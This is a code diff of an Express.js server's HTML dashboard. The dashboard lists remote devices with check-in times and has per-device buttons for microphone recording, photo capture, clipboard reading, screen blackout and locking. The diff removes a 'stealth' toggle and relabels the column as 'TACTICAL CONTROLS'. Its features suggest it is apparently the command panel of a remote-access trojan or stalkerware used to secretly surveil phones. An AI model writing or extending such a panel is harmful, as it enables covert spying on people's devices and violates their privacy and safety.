@@ -465,10 +465,6 @@ app.get('/', (req, res) => {
                 'background: rgba(255,255,0,0.2); color: var(--neon-yellow); border-color: var(--neon-yellow); box-shadow: 0 0 10px var(--neon-yellow);' :
                 'background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3);';
 
-            const stealthStyle = d.stealth ?
-                'background: rgba(255,157,0,0.2); color: var(--neon-orange); border-color: var(--neon-orange); box-shadow: 0 0 10px var(--neon-orange);' :
-                'background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3);';
-
             const micStyle = d.recording ?
                 'background: rgba(255,49,49,0.2); color: var(--danger); border-color: var(--danger); box-shadow: 0 0 10px var(--danger); animation: pulse 1s infinite;' :
                 'background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3);';
@@ -495,7 +491,6 @@ app.get('/', (req, res) => {
                         <button onclick="dispatchQuickCommand('${d.deviceId}', 'blackout')" class="btn btn-small" style="${blackoutStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold;">🕶️ BLACKOUT: ${d.blackout ? 'ON' : 'OFF'}</button>
                         <button onclick="dispatchQuickCommand('${d.deviceId}', 'lock')" class="btn btn-small" style="${lockStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold;">🔒 LOCK: ${d.locked ? 'ON' : 'OFF'}</button>
                         <button onclick="dispatchQuickCommand('${d.deviceId}', 'flashlight')" class="btn btn-small" style="${lightStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold;">🔦 LIGHT: ${d.flashlight ? 'ON' : 'OFF'}</button>
-                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'stealth')" class="btn btn-small" style="${stealthStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold;">👁️ STEALTH: ${d.stealth ? 'ON' : 'OFF'}</button>
                         <button onclick="dispatchQuickCommand('${d.deviceId}', 'mic')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer;">🎙️ MIC</button>
                         <button onclick="dispatchQuickCommand('${d.deviceId}', 'photo')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer;">📷 PHOTO</button>
                         <button onclick="dispatchQuickCommand('${d.deviceId}', 'clipboard')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer;">📋 CLIP</button>
@@ -565,7 +560,8 @@ app.get('/', (req, res) => {
                             <th>STATUS</th>
                             <th>PROFILE</th>
                             <th>LAST CHECK-IN</th>
-                            <th>ACTION</th>
+                            <th>UPLINK</th>
+                            <th>TACTICAL CONTROLS</th>
                         </tr>
                     </thead>
                     <tbody>
